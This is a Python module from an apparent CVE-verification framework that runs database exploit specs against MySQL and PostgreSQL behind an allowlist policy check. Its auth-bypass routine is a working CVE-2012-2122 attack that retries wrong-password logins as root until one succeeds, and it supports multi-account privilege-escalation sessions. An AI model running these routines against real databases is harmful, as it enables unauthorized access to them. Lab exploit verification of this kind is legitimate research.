"""Database execution_spec runner (MySQL/PostgreSQL first).

MVP 目标：
- 按 schema/setup/trigger/cleanup 顺序执行 SQL
- oracle 支持 error_pattern / result_contains / crash / row_count
- 连接失败与执行失败分开归因

未安装 DB 驱动时返回明确错误，不伪装成功。
"""

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlparse

from cve_hunter.status_codes import (
    DB_EXECUTION_FAILED,
    DB_ORACLE_FAILED,
    DB_ORACLE_SUCCESS,
    EXECUTION_POLICY_BLOCKED,
    NO_EXPLOIT_EVIDENCE,
    TARGET_ACCESS_FAILED,
)
from cve_hunter.safety import evaluate_execution_policy
from cve_hunter.config import cfg


def execute_database_spec(
    spec: dict[str, Any],
    environment: dict[str, Any] | None = None,
    *,
    cve_id: str = "",
) -> dict[str, Any]:
    environment = environment or {}
    engine = str(spec.get("engine") or "mysql").strip().lower()
    from cve_hunter.tools.db_spec import resolve_database_target

    raw_target = str(spec.get("target") or "")
    env_target = str(environment.get("target_url") or environment.get("target_host") or "")
    # 若 spec 已是 DSN 则保留账号；环境地址用于覆盖 host/port
    if raw_target.startswith(("mysql://", "postgres://", "postgresql://", "mariadb://")):
        host, port, database, user, password = _parse_db_target(raw_target, engine)
        if env_target and not env_target.startswith(("mysql://", "postgres://", "postgresql://", "mariadb://")):
            target = resolve_database_target(
                engine=engine,
                env_target=env_target,
                user=user,
                password=password,
                database=database,
                port=port,
            )
            host, port, database, user, password = _parse_db_target(target, engine)
        else:
            target = raw_target
    else:
        target = resolve_database_target(
            engine=engine,
            env_target=env_target or raw_target,
            user="postgres" if engine.startswith("postgres") else "root",
            password="postgres" if engine.startswith("postgres") else "",
            database="postgres" if engine.startswith("postgres") else "",
        )
        host, port, database, user, password = _parse_db_target(target, engine)

    policy = evaluate_execution_policy(
        target if "://" in target else f"{engine}://{host}:{port}",
        host,
        run_mode=getattr(cfg, "run_mode", "plan_only"),
        allowlist=getattr(cfg, "target_allowlist", []),
    )
    if not policy.allowed:
        return {
            "success": False,
            "skipped": True,
            "policy_blocked": True,
            "protocol": "database",
            "engine": engine,
            "error": policy.reason,
            "error_type": "policy",
            "status_code": EXECUTION_POLICY_BLOCKED,
        }

    # 数据库直连路径不经 http2pcap：在执行前后包一层 TCP dumpcap（可选）
    from cve_hunter.tools.tcp_capture import start_tcp_capture as _start_tcp_capture

    capture = _start_tcp_capture(host=host, port=port, cve_id=cve_id, protocol="database")
    try:
        action = str(spec.get("action") or "").strip().lower()
        oracle_type = str((spec.get("oracle") or {}).get("type") or "").strip().lower()
        if action in {"auth_bypass", "auth_bypass_bruteforce"} or oracle_type in {
            "auth_success",
            "auth_bypass",
            "login_success",
        }:
            result = _execute_auth_bypass(
                spec,
                engine=engine,
                host=host,
                port=port,
                database=database,
                default_user=user,
                cve_id=cve_id,
            )
            return _attach_capture(result, capture)

        sessions = [item for item in list(spec.get("sessions") or []) if isinstance(item, dict)]
        if action in {"multi_session", "multi_role", "search_path"} or sessions:
            result = _execute_multi_session(
                spec,
                environment=environment,
                engine=engine,
                host=host,
                port=port,
                default_database=database,
                cve_id=cve_id,
            )
            return _attach_capture(result, capture)

        # TCP 刚就绪时 DBMS 可能仍在初始化，短暂重试连接。
        connect: dict[str, Any] = {"success": False, "error": "数据库连接失败"}
        last_error = ""
        for attempt in range(1, 9):
            connect = _connect(engine, host, port, database, user, password)
            if connect.get("success"):
                break
            last_error = str(connect.get("error") or "数据库连接失败")
            time.sleep(min(2 * attempt, 8))
        if not connect.get("success"):
            return _attach_capture(
                {
                    "success": False,
                    "protocol": "database",
                    "engine": engine,
                    "target": f"{host}:{port}/{database}",
                    "error": last_error or connect.get("error", "数据库连接失败"),
                    "error_type": "target",
                    "status_code": TARGET_ACCESS_FAILED,
                    "phase": "connect",
                },
                capture,
            )

        conn = connect["connection"]
        cursor = connect["cursor"]
        logs: list[dict[str, Any]] = []
        try:
            for phase in ("schema_sql", "setup_sql", "trigger_sql"):
                for sql in list(spec.get(phase) or []):
                    item = _run_sql(cursor, conn, str(sql), phase=phase)
                    logs.append(item)
                    if not item.get("success") and phase != "trigger_sql":
                        return _attach_capture(
                            {
                                "success": False,
                                "protocol": "database",
                                "engine": engine,
                                "target": f"{host}:{port}/{database}",
                                "error": item.get("error", "SQL 执行失败"),
                                "error_type": "db_execution",
                                "status_code": DB_EXECUTION_FAILED,
                                "phase": phase,
                                "logs": logs,
                            },
                            capture,
                        )

            trigger_logs = [item for item in logs if item.get("phase") == "trigger_sql"]
            if not trigger_logs and list(spec.get("trigger_sql") or []):
                return _attach_capture(
                    {
                        "success": False,
                        "protocol": "database",
                        "engine": engine,
                        "target": f"{host}:{port}/{database}",
                        "error": logs[-1].get("error") if logs else "触发 SQL 未执行",
                        "error_type": "db_execution",
                        "status_code": DB_EXECUTION_FAILED,
                        "phase": "trigger_sql",
                        "logs": logs,
                    },
                    capture,
                )

            oracle = _evaluate_db_oracle(spec.get("oracle") or {}, logs)
            result = {
                "success": bool(oracle.get("success")),
                "protocol": "database",
                "engine": engine,
                "target": f"{host}:{port}/{database}",
                "phase": "oracle",
                "logs": logs,
                "oracle": oracle,
                "status_code": oracle.get("status_code")
                or (DB_ORACLE_SUCCESS if oracle.get("success") else DB_ORACLE_FAILED),
                "error": "" if oracle.get("success") else oracle.get("evidence", "数据库验证未命中"),
                "error_type": "" if oracle.get("success") else "db_oracle",
                "body": oracle.get("evidence", ""),
                "request_success": True,
            }
            return _attach_capture(result, capture)
        finally:
            for phase_sql in list(spec.get("cleanup_sql") or []):
                try:
                    _run_sql(cursor, conn, str(phase_sql), phase="cleanup_sql")
                except Exception:
                    pass
            try:
                cursor.close()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass
    finally:
        # 若内部路径异常未 stop，这里兜底
        if capture.process is not None:
            try:
                capture.stop()
            except Exception:
                pass


def _attach_capture(result: dict[str, Any], capture: Any) -> dict[str, Any]:
    """Stop dumpcap and merge pcap fields into executor result."""
    try:
        info = capture.stop() if capture is not None else {}
    except Exception as exc:
        info = {
            "pcap_file_path": "",
            "packet_count": 0,
            "capture_error": str(exc),
            "capture_enabled": True,
        }
    payload = dict(result or {})
    if info.get("pcap_file_path"):
        payload["pcap_file_path"] = info["pcap_file_path"]
    if "packet_count" in info:
        payload["packet_count"] = info.get("packet_count", 0)
    if info.get("capture_filter"):
        payload["capture_filter"] = info.get("capture_filter")
    if info.get("capture_interface"):
        payload["capture_interface"] = info.get("capture_interface")
    if info.get("capture_error"):
        payload["capture_error"] = info.get("capture_error")
    payload["capture_enabled"] = bool(info.get("capture_enabled"))
    return payload


def _execute_multi_session(
    spec: dict[str, Any],
    *,
    environment: dict[str, Any],
    engine: str,
    host: str,
    port: int,
    default_database: str,
    cve_id: str = "",
) -> dict[str, Any]:
    """按 sessions 顺序用不同账号执行 SQL（如 CVE-2018-1058 低权植入 + 超户触发）。"""
    from cve_hunter.tools.db_spec import resolve_database_target

    sessions = [item for item in list(spec.get("sessions") or []) if isinstance(item, dict)]
    if not sessions:
        return {
            "success": False,
            "protocol": "database",
            "engine": engine,
            "error": "multi_session 缺少 sessions",
            "error_type": "db_execution",
            "status_code": DB_EXECUTION_FAILED,
            "phase": "sessions",
            "action": "multi_session",
        }

    env_target = str(environment.get("target_url") or environment.get("target_host") or "")
    all_logs: list[dict[str, Any]] = []
    for index, session in enumerate(sessions):
        name = str(session.get("name") or f"session_{index + 1}")
        session_engine = str(session.get("engine") or engine).strip().lower()
        raw_target = str(session.get("target") or spec.get("target") or "")
        user = str(session.get("user") or session.get("username") or "")
        password = str(session.get("password") or "")
        database = str(session.get("database") or default_database or "")
        if raw_target.startswith(("mysql://", "postgres://", "postgresql://", "mariadb://")):
            s_host, s_port, s_db, s_user, s_pass = _parse_db_target(raw_target, session_engine)
            if env_target and not env_target.startswith(("mysql://", "postgres://", "postgresql://", "mariadb://")):
                target = resolve_database_target(
                    engine=session_engine,
                    env_target=env_target,
                    user=user or s_user,
                    password=password if password != "" else s_pass,
                    database=database or s_db,
                    port=s_port,
                )
                s_host, s_port, s_db, s_user, s_pass = _parse_db_target(target, session_engine)
            else:
                # 仍允许 session 显式 user/password 覆盖 DSN
                if user:
                    s_user = user
                if password != "":
                    s_pass = password
                if database:
                    s_db = database
                s_host, s_port = host or s_host, port or s_port
        else:
            target = resolve_database_target(
                engine=session_engine,
                env_target=env_target or f"{host}:{port}",
                user=user or ("postgres" if session_engine.startswith("postgres") else "root"),
                password=password if password != "" else ("postgres" if session_engine.startswith("postgres") else ""),
                database=database or ("postgres" if session_engine.startswith("postgres") else ""),
                port=port,
            )
            s_host, s_port, s_db, s_user, s_pass = _parse_db_target(target, session_engine)

        # 环境端口优先（compose 重映射后）
        if host:
            s_host = host
        if port:
            s_port = port

        connect: dict[str, Any] = {"success": False}
        last_error = ""
        for attempt in range(1, 9):
            connect = _connect(session_engine, s_host, s_port, s_db, s_user, s_pass)
            if connect.get("success"):
                break
            last_error = str(connect.get("error") or "数据库连接失败")
            time.sleep(min(2 * attempt, 8))
        if not connect.get("success"):
            return {
                "success": False,
                "protocol": "database",
                "engine": session_engine,
                "target": f"{s_host}:{s_port}/{s_db}",
                "error": f"会话 {name} 连接失败: {last_error}",
                "error_type": "target",
                "status_code": TARGET_ACCESS_FAILED,
                "phase": f"session:{name}:connect",
                "action": "multi_session",
                "logs": all_logs,
            }

        conn = connect["connection"]
        cursor = connect["cursor"]
        try:
            for phase in ("schema_sql", "setup_sql", "trigger_sql"):
                for sql in list(session.get(phase) or []):
                    item = _run_sql(cursor, conn, str(sql), phase=phase)
                    item["session"] = name
                    all_logs.append(item)
                    if not item.get("success") and phase != "trigger_sql":
                        return {
                            "success": False,
                            "protocol": "database",
                            "engine": session_engine,
                            "target": f"{s_host}:{s_port}/{s_db}",
                            "error": f"会话 {name} {phase} 失败: {item.get('error')}",
                            "error_type": "db_execution",
                            "status_code": DB_EXECUTION_FAILED,
                            "phase": f"session:{name}:{phase}",
                            "action": "multi_session",
                            "logs": all_logs,
                        }
        finally:
            for phase_sql in list(session.get("cleanup_sql") or []):
                try:
                    item = _run_sql(cursor, conn, str(phase_sql), phase="cleanup_sql")
                    item["session"] = name
                    all_logs.append(item)
                except Exception:
                    pass
            try:
                cursor.close()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass

    oracle_hint = dict(spec.get("oracle") or {})
    oracle_session = str(oracle_hint.get("session") or "").strip()
    eval_logs = all_logs
    if oracle_session:
        eval_logs = [item for item in all_logs if str(item.get("session") or "") == oracle_session] or all_logs
    oracle = _evaluate_db_oracle(oracle_hint, eval_logs)
    # multi_session 的 result_contains 也扫描全量 logs 行，避免只看 trigger_sql 漏掉
    if not oracle.get("success") and str(oracle_hint.get("type") or "").lower() in {
        "result_contains",
        "response_contains",
    }:
        expect = str(oracle_hint.get("expect") or oracle_hint.get("pattern") or "")
        blob = "\n".join(
            str(row)
            for item in eval_logs
            for row in (item.get("rows") or [])
        )
        # 也允许在 error/note 字段中命中
        blob += "\n" + "\n".join(str(item.get("error") or "") for item in eval_logs)
        if expect and expect in blob:
            oracle = {
                "evaluated": True,
                "success": True,
                "type": "result_contains",
                "evidence": blob[:1000],
                "status_code": DB_ORACLE_SUCCESS,
            }
    return {
        "success": bool(oracle.get("success")),
        "protocol": "database",
        "engine": engine,
        "target": f"{host}:{port}/{default_database}",
        "phase": "oracle",
        "action": "multi_session",
        "logs": all_logs,
        "oracle": oracle,
        "status_code": oracle.get("status_code")
        or (DB_ORACLE_SUCCESS if oracle.get("success") else DB_ORACLE_FAILED),
        "error": "" if oracle.get("success") else oracle.get("evidence", "数据库验证未命中"),
        "error_type": "" if oracle.get("success") else "db_oracle",
        "body": oracle.get("evidence", ""),
        "request_success": True,
        "cve_id": cve_id,
    }


def _execute_auth_bypass(
    spec: dict[str, Any],
    *,
    engine: str,
    host: str,
    port: int,
    database: str,
    default_user: str,
    cve_id: str = "",
) -> dict[str, Any]:
    """CVE-2012-2122 类：用错误密码反复尝试登录，直到偶然通过鉴权。"""
    auth = dict(spec.get("auth_bypass") or {})
    user = str(auth.get("username") or auth.get("user") or default_user or "root")
    wrong_password = str(auth.get("password") or auth.get("wrong_password") or "wrong")
    try:
        max_attempts = int(auth.get("max_attempts") or 1000)
    except (TypeError, ValueError):
        max_attempts = 1000
    max_attempts = max(1, min(max_attempts, 5000))

    # 先确认端口/服务可达：用极短连接探测 TCP 层错误与“服务未起”区分
    probe = _connect(engine, host, port, database, user, wrong_password + "_probe_unreachable")
    probe_err = str(probe.get("error") or "")
    if not probe.get("success") and _looks_like_target_down(probe_err):
        # 目标完全不可达时短暂重试，等容器就绪
        for attempt in range(1, 9):
            time.sleep(min(2 * attempt, 8))
            probe = _connect(engine, host, port, database, user, wrong_password + "_probe_unreachable")
            probe_err = str(probe.get("error") or "")
            if probe.get("success") or not _looks_like_target_down(probe_err):
                break
        if not probe.get("success") and _looks_like_target_down(probe_err):
            return {
                "success": False,
                "protocol": "database",
                "engine": engine,
                "target": f"{host}:{port}/{database}",
                "error": probe_err or "数据库目标不可达",
                "error_type": "target",
                "status_code": TARGET_ACCESS_FAILED,
                "phase": "connect",
                "action": "auth_bypass",
            }
        if probe.get("success"):
            try:
                probe["cursor"].close()
                probe["connection"].close()
            except Exception:
                pass

    logs: list[dict[str, Any]] = []
    success_connect: dict[str, Any] | None = None
    for attempt in range(1, max_attempts + 1):
        connect = _connect(engine, host, port, database, user, wrong_password)
        if connect.get("success"):
            success_connect = connect
            logs.append(
                {
                    "phase": "auth_bypass",
                    "success": True,
                    "attempt": attempt,
                    "user": user,
                    "error": "",
                }
            )
            break
        err = str(connect.get("error") or "认证失败")
        logs.append(
            {
                "phase": "auth_bypass",
                "success": False,
                "attempt": attempt,
                "user": user,
                "error": err,
            }
        )
        if _looks_like_target_down(err):
            return {
                "success": False,
                "protocol": "database",
                "engine": engine,
                "target": f"{host}:{port}/{database}",
                "error": err,
                "error_type": "target",
                "status_code": TARGET_ACCESS_FAILED,
                "phase": "auth_bypass",
                "action": "auth_bypass",
                "attempts": attempt,
                "logs": logs[-20:],
            }

    if not success_connect:
        return {
            "success": False,
            "protocol": "database",
            "engine": engine,
            "target": f"{host}:{port}/{database}",
            "error": f"鉴权绕过未命中（{max_attempts} 次错误密码尝试）",
            "error_type": "db_oracle",
            "status_code": DB_ORACLE_FAILED,
            "phase": "auth_bypass",
            "action": "auth_bypass",
            "attempts": max_attempts,
            "logs": logs[-20:],
            "oracle": {
                "evaluated": True,
                "success": False,
                "type": "auth_success",
                "evidence": f"tried={max_attempts}",
                "status_code": DB_ORACLE_FAILED,
            },
            "request_success": True,
            "body": f"auth_bypass_failed after {max_attempts} attempts",
        }

    evidence = f"auth_bypass_success attempt={logs[-1].get('attempt')} user={user}"
    conn = success_connect["connection"]
    cursor = success_connect["cursor"]
    try:
        # 额外证据：成功后执行一条无害查询
        for sql in list(spec.get("trigger_sql") or ["SELECT USER();", "SELECT VERSION();"]):
            item = _run_sql(cursor, conn, str(sql), phase="trigger_sql")
            logs.append(item)
            if item.get("success") and item.get("rows"):
                evidence = f"{evidence}; rows={item.get('rows')[:3]}"
                break
    finally:
        try:
            cursor.close()
        except Exception:
            pass
        try:
            conn.close()
        except Exception:
            pass

    return {
        "success": True,
        "protocol": "database",
        "engine": engine,
        "target": f"{host}:{port}/{database}",
        "phase": "oracle",
        "action": "auth_bypass",
        "attempts": int(logs[-1].get("attempt") or 0) if logs else 0,
        "logs": logs[-30:],
        "oracle": {
            "evaluated": True,
            "success": True,
            "type": "auth_success",
            "evidence": evidence,
            "status_code": DB_ORACLE_SUCCESS,
        },
        "status_code": DB_ORACLE_SUCCESS,
        "error": "",
        "error_type": "",
        "body": evidence,
        "request_success": True,
        "cve_id": cve_id,
    }


def _looks_like_target_down(error: str) -> bool:
    lower = (error or "").lower()
    return any(
        marker in lower
        for marker in (
            "connection refused",
            "actively refused",
            "timed out",
            "timeout",
            "no route",
            "network is unreachable",
            "name or service not known",
            "getaddrinfo",
            "can't connect",
            "cannot connect",
            "connection reset",
            "broken pipe",
            "server has gone away",
            "lost connection",
            "10061",
            "10060",
        )
    )


def _parse_db_target(target: str, engine: str) -> tuple[str, int, str, str, str]:
    default_port = 5432 if engine in {"postgres", "postgresql"} else 3306
    text = (target or "").strip()
    if not text:
        return "127.0.0.1", default_port, "", "root", ""
    if "://" not in text:
        # host:port or host:port/db
        hostport, _, db = text.partition("/")
        host, _, port_s = hostport.partition(":")
        port = int(port_s) if port_s.isdigit() else default_port
        return host or "127.0.0.1", port, db, "root", ""
    parsed = urlparse(text)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or default_port
    database = (parsed.path or "").lstrip("/")
    user = parsed.username or "root"
    password = parsed.password or ""
    return host, port, database, user, password


def _connect(engine: str, host: str, port: int, database: str, user: str, password: str) -> dict[str, Any]:
    try:
        if engine in {"postgres", "postgresql"}:
            import psycopg2  # type: ignore

            conn = psycopg2.connect(
                host=host,
                port=port,
                dbname=database or "postgres",
                user=user or "postgres",
                password=password or "",
                connect_timeout=max(3, int(getattr(cfg, "request_timeout", 30) or 30)),
            )
            conn.autocommit = True
            return {"success": True, "connection": conn, "cursor": conn.cursor()}

        # default mysql family
        try:
            import pymysql  # type: ignore

            conn = pymysql.connect(
                host=host,
                port=port,
                user=user or "root",
                password=password or "",
                database=database or None,
                connect_timeout=max(3, int(getattr(cfg, "request_timeout", 30) or 30)),
                charset="utf8mb4",
                autocommit=True,
            )
            return {"success": True, "connection": conn, "cursor": conn.cursor()}
        except ImportError:
            import MySQLdb  # type: ignore

            conn = MySQLdb.connect(
                host=host,
                port=port,
                user=user or "root",
                passwd=password or "",
                db=database or None,
                connect_timeout=max(3, int(getattr(cfg, "request_timeout", 30) or 30)),
                charset="utf8mb4",
            )
            conn.autocommit(True)
            return {"success": True, "connection": conn, "cursor": conn.cursor()}
    except ImportError as exc:
        return {
            "success": False,
            "error": f"缺少数据库驱动（MySQL 需 pymysql，PostgreSQL 需 psycopg2）: {exc}",
        }
    except Exception as exc:
        return {"success": False, "error": f"数据库连接失败: {exc}"}


def _run_sql(cursor: Any, conn: Any, sql: str, *, phase: str) -> dict[str, Any]:
    sql = (sql or "").strip()
    if not sql:
        return {"success": True, "phase": phase, "sql": sql, "skipped": True}
    try:
        cursor.execute(sql)
        rows = []
        description = getattr(cursor, "description", None)
        if description:
            try:
                rows = cursor.fetchmany(20)
            except Exception:
                rows = []
        # some drivers need explicit commit
        if hasattr(conn, "commit"):
            try:
                conn.commit()
            except Exception:
                pass
        return {
            "success": True,
            "phase": phase,
            "sql": sql,
            "rowcount": getattr(cursor, "rowcount", -1),
            "rows": [list(row) if not isinstance(row, dict) else row for row in rows],
            "error": "",
        }
    except Exception as exc:
        return {
            "success": False,
            "phase": phase,
            "sql": sql,
            "rowcount": -1,
            "rows": [],
            "error": str(exc),
        }


def _evaluate_db_oracle(oracle: dict[str, Any], logs: list[dict[str, Any]]) -> dict[str, Any]:
    hint_type = str(oracle.get("type") or "error_pattern").strip().lower()
    expect = str(oracle.get("expect") or oracle.get("pattern") or "")
    trigger_logs = [item for item in logs if item.get("phase") == "trigger_sql"]
    all_errors = "\n".join(str(item.get("error") or "") for item in trigger_logs)
    all_rows = []
    for item in trigger_logs:
        all_rows.extend(item.get("rows") or [])

    if hint_type in {"crash", "disconnect"}:
        crashed = any(not item.get("success") and _looks_like_crash(str(item.get("error") or "")) for item in trigger_logs)
        return {
            "evaluated": True,
            "success": crashed,
            "type": hint_type,
            "evidence": all_errors or "无崩溃信号",
            "status_code": DB_ORACLE_SUCCESS if crashed else DB_ORACLE_FAILED,
        }

    if hint_type in {"error_pattern", "regex"}:
        if not expect:
            # 任意触发错误都算弱证据不足
            any_error = any(not item.get("success") for item in trigger_logs)
            return {
                "evaluated": True,
                "success": False,
                "type": hint_type,
                "evidence": all_errors if any_error else "触发 SQL 无错误且未配置期望模式",
                "status_code": NO_EXPLOIT_EVIDENCE if not any_error else DB_ORACLE_FAILED,
            }
        matched = bool(re.search(expect, all_errors, re.I)) if all_errors else False
        return {
            "evaluated": True,
            "success": matched,
            "type": hint_type,
            "evidence": all_errors or "无错误输出",
            "status_code": DB_ORACLE_SUCCESS if matched else DB_ORACLE_FAILED,
        }

    if hint_type in {"result_contains", "response_contains"}:
        blob = "\n".join(str(row) for row in all_rows)
        matched = bool(expect) and expect in blob
        return {
            "evaluated": True,
            "success": matched,
            "type": hint_type,
            "evidence": blob[:1000] or "无结果行",
            "status_code": DB_ORACLE_SUCCESS if matched else DB_ORACLE_FAILED,
        }

    if hint_type in {"row_count", "min_rows"}:
        try:
            minimum = int(oracle.get("min_rows") or expect or 1)
        except (TypeError, ValueError):
            minimum = 1
        total = sum(max(int(item.get("rowcount") or 0), 0) for item in trigger_logs)
        ok = total >= minimum
        return {
            "evaluated": True,
            "success": ok,
            "type": hint_type,
            "evidence": f"rowcount={total}, min_rows={minimum}",
            "status_code": DB_ORACLE_SUCCESS if ok else DB_ORACLE_FAILED,
        }

    if hint_type in {"auth_success", "auth_bypass", "login_success"}:
        auth_logs = [item for item in logs if item.get("phase") == "auth_bypass"]
        ok = any(item.get("success") for item in auth_logs)
        evidence = ""
        for item in reversed(auth_logs):
            if item.get("success"):
                evidence = f"attempt={item.get('attempt')} user={item.get('user')}"
                break
        return {
            "evaluated": True,
            "success": ok,
            "type": hint_type,
            "evidence": evidence or f"auth_attempts={len(auth_logs)}",
            "status_code": DB_ORACLE_SUCCESS if ok else DB_ORACLE_FAILED,
        }

    return {
        "evaluated": False,
        "success": False,
        "type": hint_type,
        "evidence": f"未实现的数据库 oracle 类型: {hint_type}",
        "status_code": DB_ORACLE_FAILED,
    }


def _looks_like_crash(error: str) -> bool:
    lower = error.lower()
    return any(
        marker in lower
        for marker in (
            "server has gone away",
            "connection reset",
            "lost connection",
            "crashed",
            "segfault",
            "terminated",
            "broken pipe",
        )
    )
